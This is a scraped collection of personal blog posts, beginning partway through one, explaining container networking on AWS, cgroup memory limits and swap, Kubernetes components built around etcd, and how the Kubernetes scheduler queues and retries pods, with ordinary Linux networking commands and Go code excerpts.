might mean that on one computer you might have\ncontainers with hundreds or thousands of IP addresses (instead of just\none IP address and many ports). \n\n When I first heard of this “every container gets an IP” concept I was\nreally confused and kind of concerned. How would this even work?! My\ncomputer only has one IP address! This sounds like weird confusing\nmagic! Luckily it turns out that, as with most computer things, this is\nactually totally possible to understand. \n\n This “every container gets an IP” problem is what I’m going to explain\nin this blog post. There are other ways to network containers, but it’s\ngoing to take long enough already to just explain this one :) \n\n I’m also going to restrict myself to mostly talking about how to make this work\non  AWS . If you have your own physical datacenter there are more options. \n\n Our goal \n\n You have a  computer (AWS instance). That computer has an IP address (like\n172.9.9.9). \n\n You want your  container  to also have an IP address (like 10.4.4.4). \n\n We’re going to learn how to get a packet sent to 10.4.4.4 on the computer\n172.9.9.9. \n\n On AWS this can actually be super easy – there are these things called\n“VPC Route Tables”, and you can just say “send packets for 10.4.4.* to\n172.9.9.9 please” and AWS will make it work for you. The catch is you can\nonly have 50 of these rules, so if you want to have a cluster of more\nthan 50 instances, you need to go back to being confused about\nnetworking. \n\n some networking basics: IP addresses, MAC addresses, local networks \n\n In order to understand how you can have hundreds of IP addresses on one\nsingle machine, we need to understand a few basic things about\nnetworking. \n\n I’m going to take for granted that you know: \n\n \n In computer networking, programs send  packets  to each other \n Every packet (for the most part) has an  IP address  on it \n On Linux, the kernel is responsible for implementing most networking\nprotocols \n a little bit about  subnets : the subnet 10.4.4.0/24 means “every IP\nfrom 10.4.4.0 to 10.4.4.255”. I’ll sometimes write 10.4.4.* to mean this. \n \n\n I’ll do my best to explain the rest. \n\n Thing 0: parts of a network packet \n\n A network packet has a bunch of different parts (often called “layers”). There\nare a lot of different kinds of network packets, but let’s just talk about a\nnormal HTTP request (like  GET / ). The parts are: \n\n \n the MAC address this packet should go to (“Layer 2”) \n the source IP and destination IP (“Layer 3”) \n the port and other TCP/UDP information (“Layer 4”) \n the contents of your HTTP packet  like  GET /  (“Layer 7”) \n \n\n Thing 1: local networking vs far-away networking \n\n When you send a packet  directly  to a computer (on the same local network),\nhere’s how it works. \n\n Packets are addressed by  MAC address . My MAC address is\n 3c:97:ae:44:b3:7f ; I found it by running  ifconfig . \n\n bork@kiwi~> ifconfig\nenp0s25   Link encap:Ethernet  HWaddr 3c:97:ae:44:b3:7f \n \n\n So to send a packet to me, any computer on my local network can write\n 3c:97:ae:44:b3:7f  on it, and it gets to my computer. In AWS, “local network”\nbasically means “availability zone”. If two instances are in the  same AWS\navailability zone , they can just put the MAC address of the target computer\non it, and then the packet will get to the right place. It doesn’t matter what\nIP address is on the packet! \n\n Okay, what if my computer  isn’t  in the same local network / availability\nzone as the target computer? What then? Then  routers  in the middle need to\nlook at the IP address on the packet and get it to the right place. \n\n There is a lot to know about how routers work, and we do not have time to learn\nit all right now. Luckily, in AWS you have basically no way to configure the\nrouters, so it doesn’t matter if we don’t know how they work! To send a\npacket to an instance outside your availability zone, you need to put that\ninstance’s IP address on it. Full stop. Otherwise it ain’t gonna get there. \n\n If you manage your own datacenter, you can do clever stuff to set up your\nrouters. \n\n So! Here’s what we’ve learned, for AWS: \n\n \n if you’re in the same AZ as your target, you can just send a packet with any\nrandom IP address on it, and as long as the MAC address is right it’ll get\nthere. \n if you are in a different AZ, to send a packet to a computer, it has to have the IP address of that instance on it. \n \n\n The route table \n\n You may be wondering “julia, but how can I  control  the MAC address my\npacket gets sent to! I have never done that ever! That is very confusing!” \n\n When you send a packet to  172.23.2.1  on your local network, your operating\nsystem (Linux, for our purposes) looks up the MAC address for that IP address\nin a table it maintains (called the ARP table). Then it puts that MAC address on the packet and sends it off. \n\n So! What if I had a packet for the container  10.4.4.4  but I actually wanted it\nto go to the computer  172.23.1.1 ? It turns out this actually easy peasy! You\njust add an entry to another table. It’s all tables. \n\n Here’s command you could run to do this manually: \n\n sudo ip route add 10.4.4.0/24 via 172.23.1.1 dev eth0\n \n\n ip route add  adds an entry to the  route table  on your computer. This\nroute table entry says “Linux, whenever you see a packet for  10.4.4.* , just\nsend it to the MAC address for  172.23.2.1 , would ya darling?” \n\n we can give containers IPs! \n\n It is time celebrate our first victory! We now know\nall the basic tools for one main way to route container IP addresses! \n\n The steps are: \n\n \n pick a different subnet for every computer on your network (like 10.4.4.0/24 – that’s 10.4.4.*). That subnet will let you have 256 containers per machine. \n On every computer, add  routes  for every other computer. So you’d add a route for 10.4.1.0/24, 10.4.2.0/24, 10.4.3.0/24, etc. \n You’re done! Packets to 10.4.4.4 will now get routed to the right computer. There’s still the question of what they will do when they  get  to that computer, but we’ll get there in a bit. \n \n\n So our first tool for doing container networking is the  route table . \n\n what if the two computers are in different availability zones? \n\n We said earlier that this route table trick will only work if the computers are\nconnected directly. If the two computers are far apart (in different local\nnetworks) we’ll need to do something more complicated. \n\n We want to send a packet to the container IP 10.4.4.4, and it is on the computer\n172.9.9.9. But because the computer is far away, we  have  to address the\npacket to the IP address 172.9.9.9. Woe is us! All is lost! Where are we going\nto put the IP address 10.4.4.4? \n\n Encapsulation \n\n All is not lost. We can do a thing called “encapsulation”. This is where you\ntake a network packet and put it inside ANOTHER network packet. \n\n So instead of sending \n\n IP: 10.4.4.4\nTCP stuff\nHTTP stuff\n \n\n we will send \n\n IP: 172.9.9.9\n(extra wrapper stuff)\nIP: 10.4.4.4\nTCP stuff\nHTTP stuff\n \n\n There are at least 2 different ways of doing encapsulation: there’s “ip-in-ip” and “vxlan” encapsulation. \n\n vxlan  encapsulation takes your whole packet (including the MAC address) and\nwraps it inside a UDP packet. That looks like this: \n\n MAC address: 11:11:11:11:11:11\nIP: 172.9.9.9\nUDP port 8472 (the \"vxlan port\")\nMAC address: ab:cd:ef:12:34:56\nIP: 10.4.4.4\nTCP port 80\nHTTP stuff\n \n\n ip-in-ip  encapsulation just slaps on an extra IP header on top of your old\nIP header. This means you don’t get to keep the MAC address you wanted to send\nit to but I’m not sure why you would care about that anyway. \n\n MAC:  11:11:11:11:11:11\nIP: 172.9.9.9\nIP: 10.4.4.4\nTCP stuff\nHTTP stuff\n \n\n How to set up encapsulation \n\n Like before, you might be thinking “how can I get my kernel to do this weird\nencapsulation thing to my packets”? This turns out to be not all that hard.\nBasically all you do is set up a new  network interface  with encapsulation\nconfigured. \n\n On my laptop, I can do this using: (taken from  these instructions ) \n\n sudo ip tunnel add mytun mode ipip remote 172.9.9.9 local 10.4.4.4 ttl 255\nsudo ifconfig mytun 10.42.1.1\n \n\n Then you set up a route table, but you tell Linux to route the packet with your\nnew magical encapsulation network interface. Here’s what that looks like: \n\n sudo route add -net 10.42.2.0/24 dev mytun\nsudo route list \n \n\n I’m mostly giving you these commands to get an idea of the kinds of commands\nyou can use to create / inspect these tunnels ( ip route list  ,  ip tunnel ,\n ifconfig ) – I’ve almost certainly gotten a couple of the specifics wrong,\nbut this is about how it works. \n\n How do routes get distributed? \n\n We’ve talked a lot about adding routes to your route table (“10.4.4.4 should go\nvia 172.9.9.9”), but I haven’t explained at all how those routes should actually\n get  in your route table. Ideally you’d like them to configured automatically. \n\n Every container networking thing to runs  some  kind of daemon program\non every box which is in charge of adding routes to the route table. \n\n There are two main ways they do it: \n\n \n the routes are in an etcd cluster, and the program talks to the etcd cluster to figure out which routes to set \n use the  BGP  protocol to gossip to each other about routes, and a daemon ( BIRD ) listens for BGP messages on every box \n \n\n What happens when packets get to your box? \n\n So, you’re running Docker, and a packet comes in on the IP address 10.4.4.4. How\ndoes that packet actually end up getting to your program? \n\n I’m going to try to explain  bridge networking  here. I’m a bit fuzzy on this\nso some of this is probably wrong. \n\n My understanding right now is: \n\n \n every packet on your computer goes out through a real interface (like  eth0 ) \n Docker will create  fake  (virtual) network interfaces for every single one of your containers. These have IP addresses like 10.4.4.4 \n Those virtual network interfaces are  bridged  to your real network interface. This means that the packets get copied (?) to the network interface corresponding to the real network card, and then sent out to the internet \n \n\n This seems important but I don’t totally get it yet. \n\n finale: how all these container networking things work \n\n Okay! Now we we have all the fundamental concepts you need to know to navigate\nthis container networking landscape. \n\n Flannel \n\n Flannel supports a few different ways of doing networking: \n\n \n vxlan  (encapsulate all packets) \n host-gw  (just set route table entries, no encapsulation) \n \n\n The daemon that sets the routes gets them from an etcd cluster. \n\n Calico \n\n Calico supports 2 different ways of doing networking: \n\n \n ip-in-ip  encapsulation \n “regular” mode, (just set route table entries, no encapsulation) \n \n\n The daemon that sets the routes gets them using BGP messages from other hosts.\nThere’s still an etcd cluster with Calico but it’s not used for distributing\nroutes. \n\n The most exciting thing about Calico is that it has the option to not use\nencapsulation. If you look carefully though you’ll notice that Flannel also has\nan option to not use encapsulation! If you’re on AWS, I can’t actually tell\nwhich of these is better. They have the same limitations: they’ll both only\nwork between instances in the same availability zone. \n\n Most of these container networking things will set up all these routes and\ntunnels and stuff for you, but I think it’s important to understand what’s\ngoing on behind the scenes, so that if something goes wrong I can debug it and\nfix it. \n\n is this software defined networking? \n\n I don’t know what software defined networking. All of this helps you do\nnetworking differently, and it’s all software, so maybe it’s software defined\nnetworking? \n\n that’s all \n\n That’s all I have for now! Hopefully this was helpful. It turns out this stuff\nisn’t so bad, and spending some time with the  ip  command,  ifconfig  and\n tcpdump  can help you understand the basics of what’s going on in your\nKubernetes installation. You don’t need to be an expert network engineer! My\nawesome coworker Doug helped me understand a lot of this. \n\n  Thanks to Sophie Haskins for encouraging me to publish this :)  \n\n"},
{"url": "https://jvns.ca/blog/2017/02/17/mystery-swap/", "title": "Swapping, memory limits, and cgroups", "content": "\n     \n\n This week there was a bug at work, and I learned something new about\nmemory & swap & cgroups! \n\n Understanding how memory usage works has been an ongoing project for a while – back in December, I\nwrote  How much memory is my process using? \nwhich explains how memory works on Linux. \n\n So I felt surprised and worried yesterday when something was happening\nwith memory on Linux that I didn’t understand! Here’s the situation and\nwhy I was confused: \n\n We had some machines running builds. They were swapping. They had say\n30GB of RAM in total. 15GB was being used by some processes and 15GB by the\nfilesystem cache. I was really confused about why these machines were\nswapping, because – I know about memory! If 15GB of memory is being\nused by the filesystem cache, the OS can always free that memory!\nThere’s no reason to swap! \n\n I then learned about the “swappiness” setting, and that if “swappiness”\nis high, then the OS is more likely to swap, even if it doesn’t\nabsolutely need to. We tried setting  sysctl vm.swappiness=1 , which\nlets you tell the operating system “no, really, please don’t swap, just\ntake memory away from the filesystem cache instead”. The machine\ncontinued to swap. I was confused. \n\n After a while, we turned off swap and things got worse. Some processes\nstarted being OOM killed. (the OOM killer on Linux will kill processes\nif you run out of memory) But why? The boxes had free memory, didn’t\nthey? In my head I had an axiom “if a computer has free memory, there is\nno reason the processes on it should get OOM killed”. Obviously there\nwas something I did not understand. \n\n I finally looked at the output of  dmesg  (which is how you see messages the Linux\nkernel prints about what it’s up to) to understand why the\nprocesses were being OOM killed. And then there was this magic word:\n cgroups . Everything became clear pretty quickly: \n\n \n the processes that were being killed were in a cgroup (which we talked\nabout back in this  namespaces & groups  post) \n cgroups can have  memory limits , which are like “you are only\nallowed to use 15GB of memory otherwise your processes will get\nkilled by the OOM killer” \n and this memory limit was the reason the processes were being killed\neven though there was free memory! \n \n\n swap + cgroup memory limits = a little surprising \n\n My model of memory limits on cgroups was always “if you use more than X\nmemory, you will get killed right away”. It turns out that that\nassumptions was wrong! If you use more than X memory, you can still use\nswap! \n\n And apparently some kernels also support setting separate swap limits.\nSo you could set your memory limit to X and your swap limit to 0, which\nwould give you more predictable behavior. Swapping is weird and\nconfusing. \n\n Anyway, we found out through all this that the processes in question had\nrecently started using much more memory for very understandable reasons,\nand rolled back that change, and everything made sense again. \n\n And more importantly than everything making sense, the build system was\nhappy again. \n\n does swap even make sense? \n\n It’s not completely clear to me under what circumstances having swap on\na computer at all even makes sense. It seems like swap has some role on\ndesktop computers. \n\n I am not sure though if any of the servers we operate benefit by having\nswap enabled? This seems like it would be a good thing to understand. \n\n Like I hear the advice “no, just always turn off swap, it will be better\noverall” a lot and maybe that is the right thing! I think the reason\nthat swap is considered bad in production systems is that it has\nweird/unpredictable effects and predictability is good. \n\n Somewhat relatedly, this  swap insanity  article looks really interesting. \n\n understanding memory models is cool \n\n I learned \n\n \n the vm.swappiness exists and you can use it to make a machine more or\nless likely to swap \n that when Linux OOM kills a process in a cgroup (“container”), it\nactually prints a bunch of very useful stuff about the memory usage of\neverything else in the cgroup at the time. I should remember to look\nat dmesg earlier on! \n \n\n It’s really important to me to understand what’s happening on the\ncomputers that I work with – when something happens like “this computer\nis swapping and I don’t know WHY” it bothers me a lot. \n\n Now if I ever see a process mysteriously swapping hopefully I will remember\nabout memory limits! \n\n"},
{"url": "https://jvns.ca/blog/2017/06/04/learning-about-kubernetes/", "title": "A few things I've learned about Kubernetes", "content": "\n     \n\n I’ve been learning about  Kubernetes  at work recently. I only started\nseriously thinking about it maybe 6 months ago – my partner Kamal has\nbeen excited about Kubernetes for a few years (him: “julia! you can run\nprograms without worrying what computers they run on! it is so cool!“,\nme: “I don’t get it, how is that even possible”), but I understand it a\nlot better now. \n\n This isn’t a comprehensive explanation or anything, it’s some things\nI learned along the way that have helped me understand what’s going on. \n\n These days I am actually setting up a cluster instead of just reading\nabout it on the internet and being like “what is that??” so I am learning\nmuch faster :) \n\n I’m not going to try to explain what Kubernetes is. I liked Kelsey\nHightower’s introductory talk at Strange Loop called  “Managing Containers at Scale with CoreOS and Kubernetes” , and\nKelsey has given TONS of great Kubernetes talks over the years if you want an intro. \n\n Basically Kubernetes is a distributed system that runs programs\n(well, containers) on computers. You tell it what to run, and it\nschedules it onto your machines. \n\n a couple sketches \n\n I drew a couple of “scenes from kubernetes” sketches today trying to\nexplain very briefly things like “what happens when you add a new\nnode?“. Click for a bigger version. \n\n \n \n \n \n \n \n \n \n\n Kubernetes from the ground up \n\n One of first thing that helped me understand what was going on with\nKubernetes was Kamal’s “Kubernetes from the ground up” series \n\n He basically walks you through how all the Kubernetes components work\nwith each other one at a time – “look, you can run the kubelet by\nitself! And if you have a kubelet, you can add the API server and just\nrun those two things by themselves! Okay, awesome, now let’s add the\nscheduler!” I found it a lot easier to understand when presented like\nthis. Here’s the 3 post series: \n\n \n Part 1:  the kubelet \n Part 2:  the API server \n Part 3:  the scheduler \n \n\n Basically these posts taught me that: \n\n \n the “kubelet” is in charge of running containers on nodes \n If you tell the API server to run a container on a node, it will tell the kubelet to get it done (indirectly) \n the scheduler translates “run a container” to “run a container on node\nX” \n \n\n but you should read them in detail if you want to understand how these\ncomponents interact. Kubernetes stuff changes pretty quickly, but\nI think the basic architecture like “how does the API server interact\nwith the kubelet” hasn’t changed that much and it’s a good place to\nstart. \n\n etcd: Kubernetes’ brain \n\n The next thing that really helped me understand how Kubernetes works is\nunderstanding the role of etcd a little better. \n\n Every component in Kubernetes (the API server, the scheduler, the\nkubelet, the controller manager, whatever) is stateless. All of the\nstate is stored in a key-value store called etcd, and communication\nbetween components often happens via etcd. \n\n For example! Let’s say you want to run a container on Machine X. You do not\nask the kubelet on that Machine X to run a container. That is not the\nKubernetes way! Instead, this happens: \n\n \n you write into etcd, “This pod should run on Machine X”.\n(technically you never write to etcd directly, you do that through\nthe API server, but we’ll get there later) \n the kubelet on Machine X looks at etcd and thinks, “omg!! it says that pod should be running and I’m not running it! I will start right now!!” \n \n\n Similarly, if you want to put a container  somewhere  but you don’t\ncare where: \n\n \n you write into etcd “this pod should run somewhere” \n the scheduler looks at that and thinks “omg! there is an unscheduled\npod! This must be fixed!“. It assigns the pod a machine (Machine Y) to run on \n like before, the kubelet on Machine Y sees that and thinks “omg! that is scheduled to run on my machine! Better do it now!!” \n \n\n When I understood that basically everything in Kubernetes works by\nwatching etcd for stuff it has to do, doing it, and then writing the new\nstate back into etcd, Kubernetes made a lot more sense to me. \n\n The API server is responsible for putting stuff into etcd \n\n Understanding etcd also helped me understand the role of the API server\nbetter! The API server has a pretty straightforward set of\nresponsibilities: \n\n \n you tell it stuff to put in etcd \n if what you said makes no sense (doesn’t match the right schema),\nit refuses \n otherwise it does it \n \n\n That’s not too hard to understand! \n\n It also manages authentication (“who is allowed to put what stuff into\netcd?“) which is a pretty big deal but I’m not going to go into that\nhere. This  page on Kubernetes\nauthentication  is\npretty useful, though it’s kind of like “HERE ARE 9 DIFFERENT\nAUTHENTICATION STRATEGIES YOU COULD USE”. As far as I can tell the\nnormal way is X509 client certs. \n\n the controller manager does a bunch of stuff \n\n We talked about how the scheduler takes “here’s a pod that should run\nsomewhere” and translates that into “this pod should run on Machine X”. \n\n There are a bunch more translations like this that have to happen: \n\n \n Kubernetes daemonsets say “run this on every machine”. There’s a “daemonset\ncontroller” that, when it sees a daemonset in etcd, will create a pod on every\nmachine with that pod configuration \n You can create a replica set “run 5 of these”. The “replica set\ncontroller” will, when it sees a replica set in etcd, create 5 pods that the scheduler will\nthen schedule. \n \n\n The controller manager basically bundles a bunch of different\nprograms with different jobs together. \n\n something isn’t working? figure out which controller is responsible and look at its logs \n\n Today one of my pods wasn’t getting scheduled. I thought about it for a\nminute, thought “hmm, the scheduler is in charge of scheduling pods”,\nand went to look at the scheduler’s logs. It turned out that I’d\nreconfigured the scheduler wrong so it wasn’t starting anymore! \n\n The more I use k8s, the easier it is to figure out which component might\nbe responsible when I have a problem! \n\n Kubernetes components can run inside of Kubernetes \n\n One thing that kind of blew my mind was that – relatively core\nKubernetes components (like the DNS system, and the overlay networking\nsystem) can run inside of Kubernetes! “hey, Kubernetes, please start up\nDNS!” \n\n This is basically because in order to run programs inside Kubernetes,\nyou only need 5 things running: \n\n \n the scheduler \n the API server \n etcd \n kubelets on every node (to actually execute containers) \n the controller manager (because to set up daemonsets you need the\ncontroller manager) \n \n\n Once you have those 5 things, you can schedule containers to run on\nnodes! So if you want to run another Kubernetes component (like your\noverlay networking, or the DNS server, or anything else), you can just\nask the API server (via  kubectl apply -f your-configuration-file.yaml )\nto schedule it for you and it’ll run it! \n\n There’s also\n bootkube  where you\nrun  all  Kubernetes components inside Kubernetes (even the API server)\nbut that’s not 100% production ready today. Running stuff like the DNS\nserver inside Kubernetes seems pretty normal. \n\n Kubernetes networking: not impossible to understand \n\n this page \ndoes a pretty good job of explaining the Kubernetes networking model\n“every container gets an IP” but understanding how to actually make that\nhappen is not trivial! \n\n When I started learning about Kubernetes networking I was very\nconfused about how you give every container an IP address. In retrospect I think\nthis was because I didn’t understand some of the fundamental networking\nconcepts involved yet (to understand what an “overlay network” is and\nhow it works you actually need to understand a bunch of things about\ncomputer networking!) \n\n Now I feel mostly able to set up a container networking system\nand like I know enough concepts to debug problems I run into! I wrote\n a container networking overview  where I\ntried to summarize some of what I’ve learned. \n\n This summary of how Sophie debugged a kube-dns problem ( misadventures with kube-dns ) is a good example\nof how understanding fundamental networking concepts can help you debug\nproblems. \n\n understanding networking really helps \n\n Here are some things that I know about now that I didn’t understand very\nwell, say, 2\nyears ago. Understanding networking concepts really helps me debug issues in\nmy Kubernetes cluster – if I had to debug networking issues in a\nKubernetes cluster without understanding a lot of the networking\nfundamentals, I think I would just be googling error messages and trying\nrandom things to fix them and it\nwould be miserable. \n\n \n overlay networks (I wrote  a container networking overview   about this last year) \n network namespaces (understanding namespaces in general is really\nhelpful for working with containers) \n DNS (because Kubernetes has a DNS server) \n route tables, how to run  ip route list  and  ip link list \n network interfaces \n encapsulation (vxlan / UDP) \n basics about how to use iptables & read iptables configuration \n TLS, server certs, client certs, certificate authorities \n \n\n the Kubernetes source seems easy enough to read \n\n The Kubernetes source code is all in Go which is great. The project\nmoves pretty fast so stuff isn’t always documented (and you end up\nreading github issues sometimes to understand the current state of things),\nbut in general I find Go code eays to read and it’s reassuring to know\nthat I’m working with something written in a language I can\nunderstand. \n\n the Kubernetes slack group is great \n\n There’s a slack organization you can join by going to\n http://slack.kubernetes.io . I usually try to figure things out on my own\ninstead of going there, but people there have been super super helpful\nwhen I have asked questions. \n\n"},
{"url": "https://jvns.ca/blog/2017/07/27/how-does-the-kubernetes-scheduler-work/", "title": "How does the Kubernetes scheduler work?", "content": "\n     \n\n Hello!  We talked about Kubernetes’  overall architecture  a while back. \n\n This week I learned a few more things about how the Kubernetes scheduler\nworks so I wanted to share! This kind of gets into the weeds of how the\nscheduler works  exactly . \n\n It’s also an illustration of how to go from “how is this system even\ndesigned I don’t know anything about it?” to “okay I think I understand\nthe basic design decisions here and why they were made” without\nactually.. asking anyone (because I don’t know any kubernetes\ncontributors really, certainly not well enough to be like PLEASE EXPLAIN\nTHE SCHEDULER TO ME THANKS). \n\n This is a little stream of consciousness but hopefully it will be useful\nto someone anyway. The best most useful link I found while researching\nthis was this  Writing Controllers  document from the amazing amazing amazing  kubernetes developer documentation folder . \n\n what is the scheduler for? \n\n The Kubernetes scheduler is in charge of scheduling pods onto nodes.\nBasically it works like this: \n\n \n You create a pod \n The scheduler notices that the new pod you created doesn’t have a node assigned to it \n The scheduler assigns a node to the pod \n \n\n It’s not responsible for actually  running  the pod – that’s the\nkubelet’s job. So it basically just needs to make sure every pod has a\nnode assigned to it. Easy, right? \n\n Kubernetes in general has this idea of a “controller”. A controller’s\njob is to: \n\n \n look at the state of the system \n notice ways in which the actual state does not match the desired state\n(like “this pod needs to be assigned a node”) \n repeat \n \n\n The scheduler is a kind of controller. There are lots of different\ncontrollers and they all have different jobs and operate independently. \n\n So basically you could imagine the scheduler running a loop like this: \n\n while True:\n    pods = get_all_pods()\n    for pod in pods:\n        if pod.node == nil:\n            assignNode(pod)\n \n\n If you are not that interested in all the details of how the Kubernetes\nscheduler works you can probably stop reading now – this is a pretty\nreasonable model of how it works. \n\n I thought the scheduler  actually  worked this way because this is how the\n cronjob controller \nworks and that was the only Kubernetes component code I’d really read.\nThe cronjob controller basically iterates through all cronjobs, sees if\nit has to anything to do for any of them, sleeps for 10 seconds, and\nrepeats forever. Super simple! \n\n this isn’t how it works though \n\n So! This week we were putting a little more load on our Kubernetes\ncluster, and we noticed a problem. \n\n Sometimes a pod would get stuck in the  Pending  state (with no node\nassigned to it) forever. If we restarted the scheduler, the pod would\nget unstuck. ( this issue ) \n\n This didn’t really match up with my mental model of how the Kubernetes\nscheduler worked – surely if a pod is waiting for a node to be\nassigned, the scheduler should notice and assign that pod a node. The\nscheduler shouldn’t have to be restarted! \n\n So I went and read a bunch of code. Here is what I learned about how the\nscheduler actually works! As usual probably something here is wrong,\nthis stuff is pretty complicated and I just learned about it this week. \n\n how the scheduler works: a very quick code walkthrough \n\n This is basically just what I figured out from reading the code. \n\n We’ll start in  scheduler.go . (I actually  concatenated all the files in the scheduler together  which I found helpful for jumping around and navigating.) \n\n The core loop in the scheduler (as of commit e4551d50e5) is: \n\n ( link ) \n\n go wait.Until(sched.scheduleOne, 0, sched.config.StopEverything)\n \n\n This basically means “run  sched.scheduleOne  forever”. Cool, what does that do? \n\n func (sched *Scheduler) scheduleOne() {\n\tpod := sched.config.NextPod()\n    // do all the scheduler stuff for `pod`\n}\n \n\n Okay, what is this  NextPod()  business? Where does that come from? \n\n func (f *ConfigFactory) getNextPod() *v1.Pod {\n\tfor {\n\t\tpod := cache.Pop(f.podQueue).(*v1.Pod)\n\t\tif f.ResponsibleForPod(pod) {\n\t\t\tglog.V(4).Infof(\"About to try and schedule pod %v\", pod.Name)\n\t\t\treturn pod\n\t\t}\n\t}\n}\n \n\n Okay, that’s pretty simple! There’s a queue of pods ( podQueue ) and the next\npod comes from that queue. \n\n But how do pods end up on that queue? Here’s the code that does that: \n\n podInformer.Informer().AddEventHandler(\n\tcache.FilteringResourceEventHandler{\n\t\tHandler: cache.ResourceEventHandlerFuncs{\n\t\t\tAddFunc: func(obj interface{}) {\n\t\t\t\tif err := c.podQueue.Add(obj); err != nil {\n\t\t\t\t\truntime.HandleError(fmt.Errorf(\"unable to queue %T: %v\", obj, err))\n\t\t\t\t}\n\t\t\t},\n \n\n Basically there’s an event handler that, whenever a new pod is added,\nputs it on the queue. \n\n how the scheduler works, in English \n\n Okay now that we’ve looked through the code, here’s a summary in\nEnglish: \n\n \n At the beginning, every pod that needs scheduling gets added to a queue \n When new pods are created, they also get added to the queue \n The scheduler continuously takes pods off that queue and schedules them \n That’s it \n \n\n One interesting thing here is that – if for whatever reason a pod  fails  to\nget scheduled, there’s nothing in here yet that would make the scheduler retry.\nIt’d get taken off the queue, it fails scheduling, and that’s it. It lost its\nonly chance! (unless you restart the scheduler, in which case everything will\nget added to the pod queue again) \n\n Of course the scheduler is actually smarter than that – when a pod\nfails to schedule, in general it calls an error handler, like this: \n\n host, err := sched.config.Algorithm.Schedule(pod, sched.config.NodeLister)\nif err != nil {\n\tglog.V(1).Infof(\"Failed to schedule pod: %v/%v\", pod.Namespace, pod.Name)\n\tsched.config.Error(pod, err)\n \n\n This  sched.config.Error  function call adds the pod back to the queue\nof things that need to be scheduled, and so it tries again. \n\n wait why did our pod get stuck then? \n\n This is pretty simple – it turned out that the  Error  function wasn’t\nalways being called when there was an error. We made a patch to call the\n Error  function properly and that seems to have made it recover\nproperly! Cool! \n\n why is the scheduler designed this way? \n\n I feel like this design would be more robust: \n\n while True:\n    pods = get_all_pods()\n    for pod in pods:\n        if pod.node == nil:\n            assignNode(pod)\n \n\n so why is it instead this more complicated thing with all these caches and queues and callbacks?\nI looked at the history a bit and I think it’s basically for performance\nreasons – for example you can see this  update on scalability updates for Kubernetes 1.6 \nand this post from CoreOS about\n improving Kubernetes scheduler performance . That post says it improved the time to schedule 30,000 pods from 14 minutes to 10 minutes. That post says it improved the time to schedule 30,000 pods from 2 hours to 10 minutes. 2 hours is pretty slow! performance is important! \n\n So it makes sense to me that it would be too slow to query for all\n30,000 pods in your system every time you want to schedule a new pod,\nand that you’d actually want to do something more complicated. \n\n what the scheduler actually uses: kubernetes “informers” \n\n I want to talk about one thing I learned about that seems very important to\nthe design of all kubernetes controllers! That’s the idea of an\n“informer”. Luckily there actually  is  documentation about this that I\nfound in by googling “kubernetes informer”. \n\n This very useful document is called  Writing Controllers \nand it gives you design advice when you’re writing a controller (like\nthe scheduler or the cronjob controller). VERY COOL. \n\n If I’d found this document in the first place I think I would have\nunderstood what is going on a little more quickly. \n\n So! Informers! The doc says this: \n\n \n Use SharedInformers. SharedInformers provide hooks to receive\nnotifications of adds, updates, and deletes for a particular resource.\nThey also provide convenience functions for accessing shared caches\nand determining when a cache is primed. \n \n\n Basically when a controller runs it creates an “informer” (for example a\n“pod informer”) which is in charge of \n\n \n listing all pods in the first place \n telling you about updates \n \n\n The cronjob controller does not use an informer (using informers is more\ncomplicated, and I think it just doesn’t care as much about performance\nyet), but many (most?) other controllers do. In particular, the scheduler uses informers! You\ncan see it configuring its informer  here . \n\n requeueing \n\n There’s actually also some guidance about how to handle requeuing of\nitems that you’re handling in the “writing controllers” documentation! \n\n \n Percolate errors to the top level for consistent re-queuing. We have a\nworkqueue.RateLimitingInterface to allow simple requeuing with\nreasonable backoffs. \n\n Your main controller func should return an error when requeuing is\nnecessary. When it isn’t, it should use utilruntime.HandleError and\nreturn nil instead. This makes it very easy for reviewers to inspect\nerror handling cases and to be confident that your controller doesn’t\naccidentally lose things it should retry for. \n \n\n This seems to be good advice, it seems tricky to handle all errors\ncorrectly and so having a simple way to make sure reviewers can tell\nerrors are being handled correctly is important! Cool! \n\n you should “sync” your informers (or should you?) \n\n Okay, this is the last interesting thing I learned. \n\n Informers have this concept of a “sync”. A sync is a little bit like\nrestarting the program – you get a list of every resource you were\nwatching, so that you can check that it’s actually okay. Here’s what the\n“writing controllers” guidance has to say about syncing. \n\n \n Watches and Informers will “sync”. Periodically, they will deliver\nevery matching object in the cluster to your Update method. This is\ngood for cases where you may need to take additional action on the\nobject, but sometimes you know there won’t be more work to do. \n\n In cases where you are certain that you don’t need to requeue items when\nthere are no new changes, you can compare the resource version of the\nold and new objects. If they are the same, you skip requeuing the work.\nBe careful when you do this. If you ever skip requeuing your item on\nfailures, you could fail, not requeue, and then never retry that item\nagain. \n \n\n So this implies “you should sync, if you don’t sync then you\ncan end up in a situation where an item gets lost and never retried”.\nWhich is what happened to us! \n\n the kubernetes scheduler doesn’t resync \n\n So!! Once I learned about this idea of a “sync”, I was like.. wait,\ndoes that mean the kubernetes scheduler never resyncs? It seems that the\nanswer is “no, it doesn’t!”. here’s  the code : \n\n informerFactory := informers.NewSharedInformerFactory(kubecli, 0)\n// cache only non-terminal pods\npodInformer := factory.NewPodInformer(kubecli, 0)`\n \n\n Those numbers  0  – those are the “resync period”, which I interpret to\nmean that it never resyncs. Interesting!! Why doesn’t it ever resync? I\ndon’t know for sure, but I googled “kubernetes scheduler resync” and\nfound this pull request  #16840  (which added a resync to the scheduler), with the following 2 comments: \n\n \n @brendandburns - what is it supposed to fix? I’m really against having\nsuch small resync periods, because it will significantly affect\nperformance. \n \n\n and \n\n \n I agree with @wojtek-t . If resync ever fixes a problem, it means\nthere is an underlying correctness bug that we are hiding. I do not\nthink resync is the right solution. \n \n\n So it seems like the project maintainers decided never to resync,\nbecause when there are correctness bugs, they’d like them to be surfaced\nand fixed instead of hidden by a resync. \n\n some code-reading tips \n\n As far as I know “how the kubernetes scheduler actually works\ninternally” is not written down anywhere (like most things!). \n\n Here are a couple of things that helped me when reading it: \n\n \n Concatenate the whole thing into a big file. I said this already but\nit really helped me jump around between function calls – switching\nbetween files is confusing, especially when I don’t understand the\noverall organization yet! \n Have some specific questions. Here I was mostly trying to figure out\n“how is error handling even supposed to work? What happens if a pod\ndoesn’t get scheduled?“. So there was a lot of code about like.. the\ndetails of how it picks which node exactly to schedule a pod to that\nI didn’t need to care about at all (I still don’t know how that works) \n \n\n kubernetes is pretty good to work with so far \n\n Kubernetes is a really complicated piece of software! To get a cluster\nworking at all, you need to set up at least 6 different components (api\nserver, scheduler, controller manager, container networking thing like\nflannel, kube-proxy, the kubelet). And so (if you care about\nunderstanding the software you run, which I very much do), I have to\nunderstand what all of those components do and how they interact with\neach other and how to set each of their 